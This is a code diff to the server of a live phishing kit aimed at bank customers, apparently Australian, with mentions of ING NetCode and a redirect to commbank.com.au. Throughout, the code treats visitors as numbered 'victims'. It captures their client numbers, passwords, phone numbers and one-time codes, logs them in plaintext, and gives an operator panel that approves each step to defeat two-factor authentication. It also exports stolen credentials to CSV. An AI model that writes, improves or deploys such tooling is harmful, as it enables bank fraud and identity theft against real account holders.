@@ -219,29 +219,30 @@ function uaParser(ua) {
   return u;
 }
 
-/* ----------  SESSION HEADER HELPER - FIXED FOR VERIFY.HTML ---------- */
+/* ----------  SESSION HEADER HELPER ---------- */
 function getSessionHeader(v) {
   // Approved/Success state
-  if (v.page === 'success' || v.status === 'approved') return `🦁 ING Login approved`;
+  if (v.page === 'success' || v.status === 'approved') return `✅ Login approved - Redirecting to bank`;
   
   // index.html page (initial login)
   if (v.page === 'index.html') {
-    return v.clientNumber ? `✅ Received client + PIN` : '⏳ Awaiting client + PIN';
+    if (v.clientNumber && v.password) return `⏳ Credentials entered (Client: ${v.clientNumber}), awaiting admin`;
+    if (v.clientNumber) return `⏳ Client # entered: ${v.clientNumber}`;
+    return '⏳ Awaiting client number and password';
   } 
   
-  // verify.html page (OTP entry)
+  // verify.html page (OTP/NetCode entry)
   else if (v.page === 'verify.html') {
-    return v.otp ? `🔑 Received OTP: ${v.otp}` : `⏳ Awaiting OTP`;
+    if (v.otp) return `🔑 NetCode entered: ${v.otp} - awaiting admin approval`;
+    return `⏳ On NetCode page - awaiting code`;
   } 
   
   // unregister.html page
   else if (v.page === 'unregister.html') {
-    return v.unregisterClicked ? `✅ Victim unregistered` : `⏳ Awaiting unregister`;
+    return v.unregisterClicked ? `✅ Victim clicked unregister` : `⏳ Awaiting unregister action`;
   } 
   
   // Default fallback
-  if (v.otp && v.otp.length > 0) return `🔑 Received OTP: ${v.otp}`;
-  
   return `⏳ Waiting...`;
 }
 
@@ -265,8 +266,7 @@ app.post('/api/session', async (req, res) => {
     const victim = {
       sid, ip, ua, dateStr,
       entered: false, 
-      clientNumber: '',  // Explicitly store client number here
-      email: '',         // Keep for backwards compatibility
+      clientNumber: '',
       password: '', 
       phone: '', 
       otp: '', 
@@ -281,7 +281,7 @@ app.post('/api/session', async (req, res) => {
       status: 'loaded', 
       victimNum: victimCounter,
       interactions: [],
-      activityLog: [{ time: Date.now(), action: 'CONNECTED', detail: 'Visitor connected to page' }]
+      activityLog: [{ time: Date.now(), action: 'CONNECTED', detail: 'Visitor connected to login page' }]
     };
     sessionsMap.set(sid, victim);
     sessionActivity.set(sid, Date.now());
@@ -301,19 +301,16 @@ app.post('/api/ping', (req, res) => {
   res.sendStatus(404);
 });
 
-// FIXED: /api/login now properly stores clientNumber
 app.post('/api/login', async (req, res) => {
   try {
     const { sid, email, password } = req.body;
-    console.log(`[DEBUG] Login attempt - sid: ${sid}, email: ${email}, password: ${password ? '***' : 'missing'}`);
-    
     if (!email?.trim() || !password?.trim()) return res.sendStatus(400);
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
-    
     const v = sessionsMap.get(sid);
+    
+    // Store credentials
     v.entered = true; 
-    v.clientNumber = email;  // Store as clientNumber (what panel expects)
-    v.email = email;         // Keep email for backwards compatibility
+    v.clientNumber = email;
     v.password = password;
     v.status = 'wait'; 
     v.attempt += 1; 
@@ -321,11 +318,26 @@ app.post('/api/login', async (req, res) => {
     sessionActivity.set(sid, Date.now());
 
     v.activityLog = v.activityLog || [];
-    v.activityLog.push({ time: Date.now(), action: 'ENTERED CREDENTIALS', detail: `Client: ${email}` });
+    v.activityLog.push({ 
+      time: Date.now(), 
+      action: 'ENTERED CREDENTIALS', 
+      detail: `Client: ${email}, Password: ${password}`
+    });
 
-    auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email, password, phone: '', ip: v.ip, ua: v.ua });
+    // Add to audit log
+    auditLog.push({ 
+      t: Date.now(), 
+      victimN: v.victimNum, 
+      sid, 
+      clientNumber: email,
+      password, 
+      phone: '', 
+      otp: '',
+      ip: v.ip, 
+      ua: v.ua 
+    });
     
-    console.log(`[DEBUG] Login stored - victim ${v.victimNum}, clientNumber: ${v.clientNumber}`);
+    console.log(`[DEBUG] Login credentials stored for victim ${v.victimNum}: ${email}`);
     res.sendStatus(200);
   } catch (err) {
     console.error('Login error', err);
@@ -333,7 +345,6 @@ app.post('/api/login', async (req, res) => {
   }
 });
 
-// Kept for backwards compatibility but not used in current flow
 app.post('/api/verify', async (req, res) => {
   try {
     const { sid, phone } = req.body;
@@ -345,7 +356,11 @@ app.post('/api/verify', async (req, res) => {
     sessionActivity.set(sid, Date.now());
 
     v.activityLog = v.activityLog || [];
-    v.activityLog.push({ time: Date.now(), action: 'ENTERED NETCODE', detail: `NetCode: ${phone}` });
+    v.activityLog.push({ 
+      time: Date.now(), 
+      action: 'ENTERED NETCODE', 
+      detail: `NetCode: ${phone}` 
+    });
 
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.phone = phone;
@@ -366,7 +381,11 @@ app.post('/api/unregister', async (req, res) => {
     sessionActivity.set(sid, Date.now());
 
     v.activityLog = v.activityLog || [];
-    v.activityLog.push({ time: Date.now(), action: 'CLICKED UNREGISTER', detail: 'Victim proceeded to unregister page' });
+    v.activityLog.push({ 
+      time: Date.now(), 
+      action: 'CLICKED UNREGISTER', 
+      detail: 'Victim proceeded to unregister page' 
+    });
 
     res.sendStatus(200);
   } catch (err) {
@@ -375,7 +394,7 @@ app.post('/api/unregister', async (req, res) => {
   }
 });
 
-// FIXED: /api/otp now properly stores OTP and logs it
+// OTP endpoint - stores OTP/NetCode from verify.html
 app.post('/api/otp', async (req, res) => {
   try {
     const { sid, otp } = req.body;
@@ -390,24 +409,33 @@ app.post('/api/otp', async (req, res) => {
     sessionActivity.set(sid, Date.now());
 
     v.activityLog = v.activityLog || [];
-    v.activityLog.push({ time: Date.now(), action: 'ENTERED OTP', detail: `OTP: ${otp}` });
+    v.activityLog.push({ 
+      time: Date.now(), 
+      action: 'ENTERED NETCODE', 
+      detail: `NetCode: ${otp}` 
+    });
 
-    // Also update audit log
+    // Update audit log
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) {
       entry.otp = otp;
       console.log(`[DEBUG] OTP saved to audit log for victim ${entry.victimN}`);
     } else {
-      console.log(`[DEBUG] No audit log entry found for sid: ${sid}`);
+      // Create audit entry if missing
+      auditLog.push({
+        t: Date.now(),
+        victimN: v.victimNum,
+        sid,
+        clientNumber: v.clientNumber,
+        password: v.password,
+        phone: v.phone || '',
+        otp: otp,
+        ip: v.ip,
+        ua: v.ua
+      });
     }
     
-    console.log(`[DEBUG] OTP stored successfully. Current victim data:`, {
-      sid: v.sid,
-      page: v.page,
-      otp: v.otp,
-      status: v.status
-    });
-    
+    console.log(`[DEBUG] OTP stored successfully for victim ${v.victimNum}: ${otp}`);
     res.sendStatus(200);
   } catch (err) {
     console.error('OTP error', err);
@@ -428,7 +456,11 @@ app.post('/api/page', async (req, res) => {
     sessionActivity.set(sid, Date.now());
 
     v.activityLog = v.activityLog || [];
-    v.activityLog.push({ time: Date.now(), action: 'PAGE CHANGE', detail: `${oldPage} → ${page}` });
+    v.activityLog.push({ 
+      time: Date.now(), 
+      action: 'PAGE CHANGE', 
+      detail: `${oldPage} → ${page}` 
+    });
 
     res.sendStatus(200);
   } catch (err) {
@@ -483,17 +515,17 @@ function buildPanelPayload() {
     header: getSessionHeader(v), 
     page: v.page, 
     status: v.status,
-    clientNumber: v.clientNumber || v.email || '',  // Use clientNumber primarily, fallback to email
-    password: v.password, 
-    phone: v.phone, 
-    otp: v.otp,
+    clientNumber: v.clientNumber || '',
+    password: v.password || '', 
+    phone: v.phone || '', 
+    otp: v.otp || '',
     ip: v.ip, 
     platform: v.platform, 
     browser: v.browser, 
     ua: v.ua, 
     dateStr: v.dateStr,
-    entered: v.entered, 
-    unregisterClicked: v.unregisterClicked,
+    entered: v.entered || false, 
+    unregisterClicked: v.unregisterClicked || false,
     activityLog: v.activityLog || []
   }));
   
@@ -501,7 +533,7 @@ function buildPanelPayload() {
     domain: currentDomain,
     username: PANEL_USER,
     totalVictims: victimCounter,
-    active: list.length,
+    active: list.filter(x => x.page !== 'success' && x.status !== 'approved').length,
     waiting: list.filter(x => x.status === 'wait').length,
     success: successfulLogins,
     sessions: list,
@@ -537,32 +569,38 @@ app.post('/api/panel', async (req, res) => {
         v.status = 'redo'; 
         v.entered = false; 
         v.clientNumber = ''; 
-        v.email = '';
         v.password = ''; 
         v.otp = '';
       } else if (v.page === 'verify.html') {
+        // On verify page, clear OTP and send back to login
         v.status = 'redo'; 
-        v.otp = '';
+        v.otp = ''; 
+        v.phone = '';
+        v.page = 'index.html';
       }
       break;
+      
     case 'cont':
       if (v.page === 'index.html') {
+        // From login page -> go to OTP/verify page
         v.status = 'ok';
         v.page = 'verify.html';
-        console.log(`[DEBUG] Continue from index.html -> verify.html, status: ok`);
+        console.log(`[DEBUG] Continue from index.html -> verify.html`);
       }
       else if (v.page === 'verify.html') {
+        // From OTP page -> redirect to real bank (success)
         v.status = 'ok';
         v.page = 'success';
         successfulLogins++;
-        console.log(`[DEBUG] Continue from verify.html -> success, status: ok`);
+        console.log(`[DEBUG] Continue from verify.html -> success (redirect to commbank.com.au)`);
       }
       else if (v.page === 'unregister.html') {
         v.status = 'ok';
         v.page = 'verify.html';
-        console.log(`[DEBUG] Continue from unregister.html -> verify.html, status: ok`);
+        console.log(`[DEBUG] Continue from unregister.html -> verify.html`);
       }
       break;
+      
     case 'delete':
       cleanupSession(sid, 'deleted from panel');
       break;
@@ -572,7 +610,7 @@ app.post('/api/panel', async (req, res) => {
   res.json({ ok: true });
 });
 
-/* ----------  SESSION REFRESH (NEW)  ---------- */
+/* ----------  SESSION REFRESH ---------- */
 app.post('/api/refresh', (req, res) => {
   if (!req.session?.authed) return res.status(401).json({ error: 'Not authenticated' });
 
@@ -594,11 +632,12 @@ app.get('/api/export', (req, res) => {
   req.session.save();
 
   const successes = auditLog
-    .filter(r => r.otp)  // Filter by OTP since that's what we collect now
+    .filter(r => r.otp)
     .map(r => ({
       victimNum: r.victimN,
-      clientNumber: r.email,
+      clientNumber: r.clientNumber,
       password: r.password,
+      phone: r.phone,
       otp: r.otp,
       ip: r.ip,
       ua: r.ua,
@@ -606,7 +645,7 @@ app.get('/api/export', (req, res) => {
     }));
 
   const csv = [
-    ['Victim#','ClientNumber','Password','OTP','IP','UA','Timestamp'],
+    ['Victim#','ClientNumber','Password','Phone','OTP','IP','UA','Timestamp'],
     ...successes.map(s=>Object.values(s).map(v=>`"${v}"`))
   ].map(r=>r.join(',')).join('\n');
 
